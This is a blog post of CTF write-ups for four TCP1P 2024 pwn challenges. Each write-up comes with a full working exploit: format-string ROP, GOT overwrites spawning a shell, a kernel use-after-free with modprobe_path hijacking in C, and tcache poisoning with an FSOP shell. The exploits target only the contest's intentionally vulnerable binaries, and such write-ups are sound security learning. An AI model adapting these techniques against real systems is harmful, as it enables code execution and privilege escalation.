---
title: TCP1P 2024 - My PWN Write_ups
date: 2024-10-12
categories: [CTF, writeup]
tags: [ctf, writeup, TCP1P]     # TAG names should always be lowercase
---

This weekend I have been participating solo in the TCP1P CTF 2024. I really enjoyed this CTF. I ended up solving some pretty good challenges and finished in 23rd place. As always, I focused on PWN, and here are my Write-Ups for the best challenges I solved.  
![Amnesia](https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/Puntuacion.png)

## Amnesia
![Puntuacion](https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/amnesia.png)


- **Category:** Pwn.  
- **Points:** 221
- **Solves:** 11  
- **Author:** itoid  

## Description
Amnesia is the typical challenge with a vulnerable format string, but with certain limitations to make our life a bit harder. The program has a first format string that accepts up to 188 characters, after which there is a loop that runs infinitely until we decide to terminate the program by writing **I remember everything!**. Inside that loop, there is another vulnerable format string, but it only accepts up to 32 characters. The format strings are checked against a blacklist that prohibits the use of the characters $, p, and x. The file has all the typical protections enabled and the syscalls **execve** and **execveat** are prohibited by seccomp.   
```sh
➜  Amnesia checksec amnesia
[*] '/home/elchals/CTFs/Tcp1p/Amnesia/amnesia'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
```  

## Exploitation
I take advantage of the first format string to get all the necessary leaks: Text base, Libc base, and Stack. Since p and $ are prohibited, I have to use %c and %ld.  
With the following format string, I am going to overwrite the blacklist, because since I now only have 32 characters in the format string and can't use $, it becomes impossible to do anything more useful. In the first iteration, I overwrite the $ with any number.  
```py
payload = b'%c%c%d%c%d%c%c%c%c%c%hhn'.ljust(24, b'\x41')
payload += p64(format)
```
And in the second iteration, since I can now use $, I place a NULL byte to disable the blacklist.  
```py
payload = b'%256c%11$hhn'.ljust(24, b'\x41')
payload += p64(format)
```
From now on, since we can use the $, I write a ROP chain starting from the return address of the function to open the flag.txt, read, and write its content. I write it character by character since 32 bytes aren't enough for anything more.  
Finally, by writing **I remember everything!**, I trigger the termination of the program and the execution of the ROP chain.  

## Code
```py
#!/bin/python3
from pwn import *

context.log_level = 'INFO'
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './amnesia_patched'
elf = context.binary = ELF(process_name)
libc = ELF('./libc.so.6')

HOST = "ctf.tcp1p.team"
PORT = 20037

######################################################################################

gdb_script = f'''
    breakrva 0x16d5
    continue
    '''

######################################################################################

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT)
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path], aslr=False)
    return p

## Write one byte.
def change_byte(addr, b):
    if b == 0:
        b = 0x100
    payload = f'%{b}c%11$hhn'.encode().ljust(24, b'\x41')
    payload += p64(addr)
    print(payload)
    p.sendlineafter(b'remember?', payload)

######################################################################################

p = connect()

## Leaking things
payload  = b'%c' * 2
payload += b'||%ld||'
payload += b'%c'
payload += b'||%ld||'
payload += b'%c' * 35
payload += b'%||%ld||'

p.sendlineafter(b'you?', payload)
p.recvuntil(b'||')
libc.address = int(p.recvuntil(b'||')[:-2]) - (0x70fe15514887 - 0x70fe15400000)
print("[i] Libc Address:", hex(libc.address))

p.recvuntil(b'||')
stack = int(p.recvuntil(b'||')[:-2])
print("[i] Stack:", hex(stack))

rip = stack + (0x7ffcb0edf088 - 0x7ffcb0edea30) 
print("[i] RIP:", hex(rip))

p.recvuntil(b'||')
elf.address = int(p.recvuntil(b'||')[:-2]) - (0x5b435bdd36f7 - 0x5b435bdd2000)
print("[i] .text:", hex(elf.address))

## Overwriting Blacklist
format = elf.address + (0x65066ca92010 - 0x65066ca8e000)    # Blacklist address

payload = b'%c%c%d%c%d%c%c%c%c%c%hhn'.ljust(24, b'\x41')
payload += p64(format)
print(payload)
p.sendlineafter(b'remember?', payload)

payload = b'%256c%11$hhn'.ljust(24, b'\x41')
payload += p64(format)
print(payload)
p.sendlineafter(b'remember?', payload)

## Writing flag.txt to bss section
bss = elf.address + (0x63e12b96f000 - 0x63e12b96b000) + 0x900
print("[i] BSS:", hex(bss))

flag = b'flag.txt\x00'
idx = 0
for b in flag:
    change_byte(bss + idx, b)
    idx += 1

## ROP
context.arch = 'amd64'
rop_libc = ROP(libc)

pop_rsi  = p64(rop_libc.find_gadget(['pop rsi', 'ret'])[0])
pop_rdi  = p64(rop_libc.find_gadget(['pop rdi', 'ret'])[0])
ret      = p64(rop_libc.find_gadget(['ret'])[0])
pop_rdx_rbx  = p64(libc.address + 0x00000000000904a9) # pop rdx ; pop rbx ; ret
pop_rax  = p64(rop_libc.find_gadget(['pop rax', 'ret'])[0])
push_rax = p64(libc.address + 0x0000000000041563) # push rax ; ret
mov_edi_eax = p64(libc.address + 0x000000000012684c) # mov edi, eax ; call rdx

payload  = pop_rdi
payload += p64(bss)
payload += pop_rsi
payload += p64(0)
payload += p64(libc.sym.open)

payload += pop_rdx_rbx
payload += pop_rsi * 2
payload += mov_edi_eax
payload += pop_rsi
payload += p64(bss)
payload += pop_rdx_rbx
payload += p64(0x100) * 2
payload += p64(libc.sym.read)

payload += pop_rdi
payload += p64(1)
payload += pop_rsi
payload += p64(bss)
payload += pop_rdx_rbx
payload += p64(0x100) * 2
payload += p64(libc.sym.write)

idx = 0
for b in payload:
    change_byte(rip + idx, b)
    idx += 1

p.sendlineafter(b'remember?', b'I remember everything!')

######################################################################################

p.interactive()
```

## Baby CFHP
![Baby](https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/BabyCFHT.png)


- **Category:** Pwn.  
- **Points:** 221
- **Solves:** 11  
- **Author:** rui  

## Description
This challenge allows us to write a single byte at the address we want. That byte is encoded using:  
```c
*ptr = (*ptr & ~((1<<16)-1)) | ((*ptr & 0xff) ^ ((val & 0xff) ^ ((val & 0xff) >> 1))) | (*ptr & 0xffff &~0xff);	
```
Challenge protections:  
```
➜  baby_cfhp checksec chall  
[*] '/home/elchals/CTFs/Tcp1p/baby_cfhp/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

## Exploitation
I haven't tried to decipher how that encoding works. Instead, I have created a function to obtain the byte I need to write using brute force.  
```py
def find_value(ptr, val):
    for i in range(0x100):
        b = ptr ^ (i ^ (i >> 1))
        if b == val:
            print("[i] byte:", hex(i))
            return i
```
I used the first flip byte to modify **exit@Got** so that it points to _start, creating an infinite loop to perform all the necessary flips. After that, I change it to call **main**. Then, I obtain a libc leak from stderr by pointing **setbuf@got** to **puts**. Finally, I call **system("/bin/sh")** by modifying **setbuf@got** to point to **system** and writing **"/bin/sh"** to **stderr**.  

## Code
```py
#!/bin/python3
from pwn import *

context.log_level = 'INFO'
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './chall_patched'
elf = context.binary = ELF(process_name)
libc = ELF('./libc.so.6')

HOST = "ctf.tcp1p.team"
PORT = 20011

######################################################################################

gdb_script = f'''
    #set breakpoint pending on
    continue
    '''

def find_value(ptr, val):
    for i in range(0x100):
        b = ptr ^ (i ^ (i >> 1))
        if b == val:
            print("[i] byte:", hex(i))
            return i

def change_addr(addr, new_byte, actual_byte):
    new_byte = find_value(actual_byte, new_byte)
    p.sendlineafter(b'address:', str(addr).encode())
    p.sendlineafter(b'value:', str(new_byte).encode())

def write_qword(addr, actual_value, new_value):
    actual_value = p64(actual_value)
    new_value = p64(new_value)

    for i in range(8):
        print(f"Addr {hex(addr + i)}, {hex(new_value[i])}, {hex(actual_value[i])}")
        change_addr(addr + i, new_value[i], actual_value[i])

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT, ssl=False)        
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path])
    return p


######################################################################################

p = connect()

# exit@got -> _start
change_addr(elf.got.exit, 0xd0, 0x70)

# Looping Main
# [0x404018] stack_chk_fail@got -> main 
change_addr(elf.got.__stack_chk_fail, 0xb6, 0x30)
change_addr(elf.got.__stack_chk_fail+1, 0x11, 0x10)

# exit@got -> __stack_chk_fail@plt> -> main
change_addr(elf.got.exit, 0x80, 0xd0)

# Leaking Libc Base with setbuf->puts
# [0x404020] setbuf@Got -> 0x7ffff7c80e50 <puts>
change_addr(elf.got.setbuf, 0x50, 0xe0)
change_addr(elf.got.setbuf+1, 0x0e, 0x7f)

# Stderr+8 = libc address
# 0x404080 <stderr@GLIBC_2.2.5>:	0x00007ffff7e1b6a0	
# 0x7ffff7e1b6a0 <_IO_2_1_stderr_>:	0x00000000fbad2087	0x00007ffff7e1b723
change_addr(0x404080, 0xa8, 0xa0)

# exit@got -> _start
# $2 = {<text variable, no debug info>} 0x4010d0 <_start>
# [0x404038] exit@GLIBC_2.2.5 -> 0x401080 (__stack_chk_fail@plt) ◂— endbr64 
change_addr(elf.got.exit, 0xd0, 0x80)

p.recvline()
p.recvline()
leak = u64(p.recvline().strip().ljust(8, b'\x00')) 
libc.address = leak - (0x7ffff7e1b723 - 0x7ffff7c00000)
print("[i] Libc Base:", hex(libc.address))

# ROP
rop_libc = ROP(libc)
binSh    = next(libc.search(b"/bin/sh"))
system = libc.sym.system

print("[i] BinSh:", hex(binSh))

# 0x401080 <__stack_chk_fail@plt>:	endbr64
# exit@got -> __stack_chk_fail@plt> -> main
change_addr(elf.got.exit, 0x80, 0xd0)

# 0x404080 <stderr@GLIBC_2.2.5>:	0x00007ffff7e1b6a0	-> binSh
actual_value = libc.address + (0x00007ffff7e1b6a8 - 0x7ffff7c00000)
write_qword(0x404080, binSh, actual_value)

# [0x404020] setbuf@GLIBC_2.2.5 -> 0x7ffff7c80e50 (puts) ◂— endbr64 
# setbuf@GLIBC_2.2.5 -> System
write_qword(elf.got.setbuf, system, libc.sym.puts)

# [0x404038] exit@GLIBC_2.2.5 -> 0x401080 (__stack_chk_fail@plt) ◂— endbr64 
# exit@GLIBC_2.2.5 -> start
change_addr(elf.got.exit, 0xd0, 0x80)

######################################################################################

p.interactive()
```

## K-Revenge
![K_revenge](https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/K-Revenge.png)


- **Category:** Pwn.  
- **Points:** 661
- **Solves:** 4  
- **Author:** rui  

## Description
This is an exploitation challenge of a relatively simple Kernel module. The Kernel module accepts three commands through **ioctl** calls: Write, Read, and Free.
- Write reads a buffer from userland and copies it to kernel space. The module allocates an object of the size indicated in the ioctl and stores the pointer to this object in a global variable. The size is limited from 0x80 to 0x400 bytes. Only one object can be allocated at a time.   
- Read reads from the object allocated in the global variable the number of bytes indicated by the ioctl and copies it to userland.  
- Free releases the object pointed to by the global variable but does not set the global variable to NULL, allowing for a Use-After-Free (UAF) and enabling a double free.  
One thing that makes this not a very difficult challenge is that the pointers in the SLUB free list are not mangled.  

## Exploitation
First, I obtained the kernel base through the UAF and timerfd. After this, I poisoned the SLUB free list to allocate an object in modprobe_path and overwrite it to read the flag.  

## Code
```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <sys/timerfd.h>

#define WRITE 0x1111 
#define READ 0x2222 
#define FREE 0x3333 

struct data{
    unsigned long size;
    char *buff;
};

struct data Data;
char buff[0x1000];


//######################################################################
//######################################################################

void fatal(const char *msg) {
  perror(msg);
  exit(1);
}



void pausa() {
    printf("[!] PAUSA - pulsa una tecla.\n");
    getchar();
}

int open_file(char *file, int flags, int verbose){
    int fd = open(file, flags);
    if (fd < 0) {
        fatal("[!] Error al abrir el archivo.");
    } else {
        if (verbose) printf("[*] %s abierto con fd %d.\n", file, fd);
    }
    return fd;
}

void dump_buffer(void *buf, int len) {
    printf("\n[i] Dumping %d bytes.\n\n", len);
    for (int i = 0; i < len; i += 0x10){
        printf("ADDR[%d, 0x%x]:\t%016lx: 0x", i / 0x08, i, (unsigned long)(buf + i));
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j));
        printf(" - 0x");
        for (int j = 7; j >= 0; j--) printf("%02x", *(unsigned char *)(buf + i + j + 8));
        puts("");
    }
}

void timer_leak() {
    int timefd =  syscall(__NR_timerfd_create, CLOCK_REALTIME, 0);
    struct itimerspec itimerspec;

	itimerspec.it_interval.tv_sec = 0;
	itimerspec.it_interval.tv_nsec = 0;
	itimerspec.it_value.tv_sec = 100;
	itimerspec.it_value.tv_nsec = 0;

	timerfd_settime(timefd, 0, &itimerspec, 0);
	close(timefd);
	sleep(1);
}

void setup() {
	system("echo -ne '#!/bin/sh\ncat /root/flag > /tmp/flag' > /tmp/p");
	system("chmod a+x /tmp/p");
	system("echo -ne '\xff\xff\xff\xff' > /tmp/executeme");
	system("chmod a+x /tmp/executeme");
	printf("[i] Modprobe Setup done.\n");
}

void finish() {
	system("/tmp/executeme ; cat /tmp/flag");
}

//######################################################################
//######################################################################


int main(){

    setup();    
    int fd = open_file("/dev/K", O_RDWR, 1);

    memset(buff, 0x41, 0x1000);

    Data.size = 0x100;
    Data.buff = buff;

    ioctl(fd, WRITE, &Data);
    memset(buff, 0, 0x1000);

    ioctl(fd, FREE, &Data);
    
    timer_leak();
    
    ioctl(fd, READ, &Data);
    
    unsigned long kernel_base = *((unsigned long *)Data.buff + 5) - 0x2fdb30;
    printf("[i] Kernel Base: 0x%lx\n", kernel_base);

    unsigned long modprobe = kernel_base + (0xffffffff8ab3f100 - 0xffffffff89000000);
    printf("[i] Modprobe: 0x%lx\n", modprobe);

    ioctl(fd, WRITE, &Data);

    memset(buff, 0, 0x1000);
    Data.size = 0x80;
    ioctl(fd, WRITE, &Data);
    ioctl(fd, READ, &Data);
    
    ioctl(fd, FREE, &Data);
    ioctl(fd, FREE, &Data);
    ioctl(fd, READ, &Data);
    dump_buffer(Data.buff, 0x80);

    *(unsigned long*)(buff + 0x40) = (unsigned long)modprobe - 0x30;
    memcpy(buff + 0x30, "/tmp/p\x00", 7);
    ioctl(fd, WRITE, &Data);
    ioctl(fd, WRITE, &Data);
    ioctl(fd, WRITE, &Data);

    finish();

    return 0;
}
```

## SIM
![SIM](https://raw.githubusercontent.com/elchals/elchals.github.io/main/_posts/2024-10-13_Imges/SIM.png)


- **Category:** Pwn.  
- **Points:** 181
- **Solves:** 13  
- **Author:** hygge  

## Description
SIM is a very interesting challenge. It is perhaps the one I liked the most and the one that was the most difficult for me. The challenge has a race condition in the ExecuteTerminate and ExecuteLaunch functions, which allows for both an OOB (Out-of-Bounds) and a UAF (Use-After-Free).  
The protections of the binary are:  
```
➜  SIM checksec chall 
[*] '/home/elchals/CTFs/Tcp1p/SIM/chall'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
```
It uses GLIBC 2.35 and when the challenge is started, it creates a thread that is controlled from the parent process through the menu:  
```
➜  SIM ./chall     
[*] Controller started
Options:
0. Create VM
1. Delete VM
2. Launch VM
3. Terminate VM
Input: 
[*] Backend started
```

## Exploitation
First, I filled the tcache to obtain a libc leak using the race condition in ExecuteTerminate, causing a UAF by freeing the chunk before its contents are printed. Then, I obtained a heap leak by doing the same as before but with a chunk in tcache. After that, through the race condition in ExecuteLaunch, I performed a tcache poisoning to allocate a chunk in stdout and then ended up calling **system("/bin/sh")** using FSOP.  

## Code
```py
#!/bin/python3
from pwn import *
import time

context.log_level = 'INFO'
context.terminal = ['remotinator', 'vsplit', '-x']
context.arch = 'amd64'

######################################################################################

process_name = './chall_patched'
elf = context.binary = ELF(process_name)
libc = ELF('./libc.so.6')

HOST = "ctf.tcp1p.team"
PORT = 55551

######################################################################################

gdb_script = f'''
    #set breakpoint pending on
    continue
    '''

def create(idx, size, content, wait):
    if wait:
        p.sendlineafter(b'Input:', b'0')
    else:
        p.sendline(b'0')
    p.sendlineafter(b'>> ', str(idx).encode())
    p.sendlineafter(b'>> ', str(size).encode())
    p.sendlineafter(b'>> ', content)

def delete(idx):
    p.sendlineafter(b'Input:', b'1')
    p.sendlineafter(b'>> ', str(idx).encode())

def launch(idx):
    p.sendlineafter(b'Input:', b'2')
    p.sendlineafter(b'>> ', str(idx).encode())

def terminate():
    p.sendlineafter(b'Input:', b'3')
       

######################################################################################

def connect():
    if args.REMOTE:
        print(f"[*] Connecting to {HOST} : {PORT}")
        p = remote(HOST, PORT, ssl=False)        
    elif args.GDB:
        print(f'[*] Debugging {elf.path}.')
        p = gdb.debug([elf.path], gdbscript=gdb_script, aslr=False)
    else:
        print(f'[*] Executing {elf.path}.')
        p = process([elf.path])
    return p

def FSOP_payload(libc):
    file_struct_addr = libc.sym._IO_2_1_stdout_
    print(f'[*] STDOUT addr: {hex(file_struct_addr)}')

    # Payload. 
    # ======================================= #
    _IO_wfile_jumps = libc.symbols['_IO_wfile_jumps']
    __GI__IO_wfile_overflow = _IO_wfile_jumps + 0x18
    fake_vtable_pointer = __GI__IO_wfile_overflow - 0x38     # vtable + 0x38 -> __GI__IO_wfile_overflow
    widewide_data_struc_pointer = file_struct_addr
    flags = 0x3b111111fbad2005     

    fp = FileStructure()  
    fp.flags = flags
    fp._IO_read_ptr = 0x68732f6e69622f                       # /bin/bash
    fp._lock = file_struct_addr + 0x60  
    fp._wide_data = widewide_data_struc_pointer
    fp.vtable = fake_vtable_pointer
    fp._old_offset = libc.sym.system                         # wide_vtable + 0x68

    wide_vtable = file_struct_addr + 0x10
    
    payload  = bytes(fp)
    payload += p64(wide_vtable)

    print(fp)    
    return payload

######################################################################################

p = connect()

for i in range(12):
    create(i, 8, p8(0x40 + i) * 7, 1)

launch(0)

# Fill Tcache
for i in range(2, 9):
    delete(i)

delete(1)

terminate()
delete(0)   # Unsorted Bin

# Leak Libc from unsorted bin
print("[i] Leaking Libc Base...")
p.recvuntil(b'[*] Your Config: \n')
libc.address = u64(p.recv(8)) - (0x7ffff7e1ace0 - 0x7ffff7c00000)
print("[i] Libc base:", hex(libc.address))

create(0, 8, p8(0x40 ) * 7, 0)
for i in range(1, 9):
    create(i, 8, p8(0x40 + i) * 7, 1)

delete(8)   # Tcache

launch(7)
terminate()
delete(7)

create(7, 498, p8(0x50 ) * 7, 1)

# Leak Heap base
print("[i] Leaking Heap...")
p.recvuntil(b'\x91\x00\x00\x00\x00\x00\x00\x00')
heap = u64(p.recv(8)) << 12
print("[i] Heap:", hex(heap))

chunk = heap + 0x670 #0x660
print("[i] Chunk:", hex(chunk))

create(8, 8, p8(0x50 ) * 7, 0)  

for i in range(0, 5):
    delete(i)

delete(8)   # Victim chunk

payload = FSOP_payload(libc)

delete(11)
create(11, 0x78, payload[0x70:0x70+0x77], 1)

payload2 = p64(0) * 4
payload2 += payload

delete(10)
create(10, 0x120, payload2[:0x77], 1)

mangled_ptr = (libc.sym._IO_2_1_stdout_ - 0x20) ^ chunk >> 12

delete(5)
create(5, 0x21, p64(mangled_ptr), 1)

delete(7)   
create(7, 8, p8(0x47) * 7, 1)
launch(7)

delete(7)
time.sleep(2)
launch(5)

flags = 0x00000000fbad2887

p.recvuntil(b'Success')
terminate()

p.recvuntil(b'Success')

create(7, 8, p8(0x47) * 7, 0)

create(3, 8, p64(flags)[:-1], 1)
launch(3)

time.sleep(2)
launch(10)

######################################################################################

p.interactive()
```
